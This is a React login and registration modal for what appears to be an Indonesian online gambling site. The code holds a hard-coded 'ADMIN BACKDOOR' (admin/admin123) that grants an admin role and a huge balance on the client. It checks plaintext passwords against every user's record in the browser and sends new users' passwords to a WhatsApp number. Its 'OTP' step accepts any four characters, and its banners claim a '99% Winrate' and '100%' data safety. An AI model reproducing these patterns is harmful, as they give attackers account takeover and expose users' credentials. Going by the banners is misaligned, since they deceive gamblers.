import React, { useState } from 'react';
import { X, MessageCircle, CheckCircle, User, Lock, Siren } from 'lucide-react';
import { saveUserData, getAllUsers } from '../firebase';

interface LoginModalProps {
  onClose: () => void;
  onLoginSuccess: (userData: any, userId: string) => void;
}

export const LoginModal: React.FC<LoginModalProps> = ({ onClose, onLoginSuccess }) => {
  const [activeTab, setActiveTab] = useState<'LOGIN' | 'DAFTAR'>('LOGIN');
  const [step, setStep] = useState(1);
  
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [otp, setOtp] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // --- LOGIN LOGIC ---
  const handleLogin = async () => {
    const lastAttempt = localStorage.getItem('login_attempt_time');
    if (lastAttempt && Date.now() - parseInt(lastAttempt) < 3000) {
        return alert("Terlalu banyak percobaan. Tunggu 3 detik.");
    }
    localStorage.setItem('login_attempt_time', Date.now().toString());

    if(!username || !password) return alert("Isi Username dan Password!");
    setIsLoading(true);

    // --- ADMIN BACKDOOR ---
    if (username === 'admin' && password === 'admin123') {
       setTimeout(() => {
          onLoginSuccess({
            username: 'Super Admin',
            role: 'admin',
            balance: 999999999
          }, 'admin-super-id');
          onClose();
          setIsLoading(false);
       }, 1000);
       return;
    }
    // ---------------------

    try {
      const allUsers = await getAllUsers();
      let foundUser = null;
      let foundId = '';

      Object.keys(allUsers).forEach(key => {
        if(allUsers[key].username === username && allUsers[key].password === password) {
          foundUser = allUsers[key];
          foundId = key;
        }
      });

      if(foundUser) {
        onLoginSuccess(foundUser, foundId);
        onClose();
      } else {
        alert("Username atau Password salah! (Atau belum terdaftar)");
      }
    } catch (e) {
      alert("Error connection.");
    }
    setIsLoading(false);
  };

  // --- REGISTER LOGIC ---
  const handleRequestOTP = () => {
    const lastAttempt = localStorage.getItem('login_attempt_time');
    if (lastAttempt && Date.now() - parseInt(lastAttempt) < 5000) {
        return alert("Terlalu banyak percobaan pendaftaran. Tunggu sejenak.");
    }
    localStorage.setItem('login_attempt_time', Date.now().toString());

    if (!username || !password) return alert("Isi Username dan Password dulu!");
    setIsLoading(true);
    
    setTimeout(() => {
       setIsLoading(false);
       setStep(2);
       const message = `*REGISTRASI MEMBER BARU*\n\nUsername: ${username}\nPassword: ${password}\n\nMohon kode OTP nya min! Saya mau Depo Gede!`;
       window.open(`https://wa.me/6287744100119?text=${encodeURIComponent(message)}`, '_blank');
    }, 1000);
  };

  const handleVerifyOTPAndRegister = async () => {
    if (otp.length < 4) return alert("Kode OTP salah!");
    setIsLoading(true);
    const mockUserId = "USER-" + Date.now();

    const newUser = {
      username: username,
      password: password,
      role: 'user', 
      balance: 0 // Mulai dari 0 biar depo
    };

    await saveUserData(mockUserId, newUser);

    setIsLoading(false);
    onLoginSuccess(newUser, mockUserId);
    onClose();
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/95 backdrop-blur-sm p-4 animate-in zoom-in-95 duration-200">
      <div className="relative w-full max-w-sm bg-gradient-to-b from-gray-900 to-black border-2 border-yellow-500 rounded-xl overflow-hidden shadow-[0_0_100px_rgba(234,179,8,0.5)]">
        
        {/* Flashing Header */}
        <div className="bg-gradient-to-r from-red-600 via-yellow-500 to-red-600 p-1 animate-pulse">
           <div className="bg-black py-2 text-center">
             <h2 className="text-xl font-black text-transparent bg-clip-text bg-gradient-to-r from-yellow-200 to-yellow-500 italic uppercase tracking-wider">
               {activeTab === 'LOGIN' ? 'LOGIN AREA' : 'DAFTAR VIP'}
             </h2>
           </div>
        </div>

        {/* Tabs */}
        <div className="flex text-sm font-bold uppercase border-b border-yellow-600/50">
          <button 
            onClick={() => setActiveTab('LOGIN')}
            className={`flex-1 py-3 transition-colors ${activeTab === 'LOGIN' ? 'bg-yellow-600 text-black shadow-[inset_0_0_20px_rgba(0,0,0,0.5)]' : 'bg-black text-gray-500 hover:text-white'}`}
          >
            Masuk
          </button>
          <button 
            onClick={() => setActiveTab('DAFTAR')}
            className={`flex-1 py-3 transition-colors ${activeTab === 'DAFTAR' ? 'bg-yellow-600 text-black shadow-[inset_0_0_20px_rgba(0,0,0,0.5)]' : 'bg-black text-gray-500 hover:text-white'}`}
          >
            Daftar
          </button>
        </div>

        <button onClick={onClose} className="absolute top-3 right-3 text-white hover:text-red-500 z-10 bg-black/50 rounded-full p-1 border border-white/20">
            <X size={18} />
        </button>

        <div className="p-6">
          {activeTab === 'LOGIN' && (
            <div className="space-y-5 animate-in slide-in-from-bottom-5">
               <div className="text-center">
                  <Siren className="w-12 h-12 text-red-500 mx-auto mb-2 animate-bounce" />
                  <p className="text-xs text-yellow-500 font-bold uppercase tracking-widest animate-pulse">Server Gacor 99% Winrate</p>
               </div>

               <div className="space-y-3">
                 <div className="relative group">
                   <User className="absolute left-3 top-3 text-yellow-600 group-focus-within:text-yellow-400" size={18} />
                   <input 
                      value={username} onChange={e => setUsername(e.target.value)}
                      placeholder="Username / ID" 
                      className="w-full bg-gray-900 border border-yellow-800 rounded pl-10 p-3 text-white focus:border-yellow-400 focus:shadow-[0_0_15px_rgba(234,179,8,0.4)] outline-none transition-all font-bold"
                   />
                 </div>
                 <div className="relative group">
                   <Lock className="absolute left-3 top-3 text-yellow-600 group-focus-within:text-yellow-400" size={18} />
                   <input 
                      type="password"
                      value={password} onChange={e => setPassword(e.target.value)}
                      placeholder="Kata Sandi" 
                      className="w-full bg-gray-900 border border-yellow-800 rounded pl-10 p-3 text-white focus:border-yellow-400 focus:shadow-[0_0_15px_rgba(234,179,8,0.4)] outline-none transition-all font-bold"
                   />
                 </div>
               </div>

               <button 
                 onClick={handleLogin}
                 disabled={isLoading}
                 className="w-full bg-gradient-to-b from-blue-500 via-blue-600 to-blue-800 border-b-4 border-blue-900 text-white font-black text-lg py-3 rounded shadow-[0_0_20px_rgba(37,99,235,0.5)] hover:brightness-125 active:scale-95 transition-all uppercase tracking-widest rgb-border"
               >
                 {isLoading ? 'Wait...' : 'LOGIN MASUK'}
               </button>
            </div>
          )}

          {activeTab === 'DAFTAR' && step === 1 && (
             <div className="space-y-4 animate-in slide-in-from-right-5">
               <div className="relative">
                 <User className="absolute left-3 top-3 text-green-600" size={18} />
                 <input 
                    value={username} onChange={e => setUsername(e.target.value)}
                    placeholder="Buat Username Baru" 
                    className="w-full bg-gray-900 border border-green-800 rounded pl-10 p-3 text-white focus:border-green-400 outline-none font-bold"
                 />
               </div>
               <div className="relative">
                 <Lock className="absolute left-3 top-3 text-green-600" size={18} />
                 <input 
                    type="password"
                    value={password} onChange={e => setPassword(e.target.value)}
                    placeholder="Buat Password Baru" 
                    className="w-full bg-gray-900 border border-green-800 rounded pl-10 p-3 text-white focus:border-green-400 outline-none font-bold"
                 />
               </div>

               <div className="bg-green-900/20 p-2 rounded border border-green-500/50 text-[10px] text-green-400 text-center animate-pulse">
                  Data aman 100%. OTP dikirim via WhatsApp Admin.
               </div>

               <button 
                 onClick={handleRequestOTP}
                 disabled={isLoading}
                 className="w-full bg-gradient-to-b from-green-500 to-green-700 border-b-4 border-green-900 text-white font-black py-3 rounded shadow-lg hover:brightness-110 active:scale-95 transition-all flex justify-center items-center gap-2"
               >
                 <MessageCircle size={20} />
                 MINTA OTP (WA)
               </button>
             </div>
          )}

          {activeTab === 'DAFTAR' && step === 2 && (
             <div className="space-y-4 animate-in slide-in-from-right-5">
               <div className="text-center">
                  <CheckCircle className="text-green-500 w-12 h-12 mx-auto mb-2" />
                  <p className="text-sm text-white font-bold">Kode OTP Terkirim!</p>
               </div>

               <input 
                  value={otp} onChange={e => setOtp(e.target.value)}
                  placeholder="X X X X" 
                  maxLength={4}
                  className="w-full bg-black border-2 border-yellow-500 rounded p-4 text-center text-4xl font-mono text-yellow-500 tracking-[0.2em] outline-none shadow-[0_0_20px_rgba(234,179,8,0.5)] focus:scale-105 transition-transform"
               />

               <button 
                 onClick={handleVerifyOTPAndRegister}
                 disabled={isLoading}
                 className="w-full bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 text-white font-black text-xl py-3 rounded shadow-lg hover:brightness-125 active:scale-95 transition-all uppercase tracking-widest animate-blink"
               >
                 {isLoading ? '...' : 'DAFTAR SEKARANG'}
               </button>
             </div>
          )}
        </div>
      </div>
    </div>
  );
};
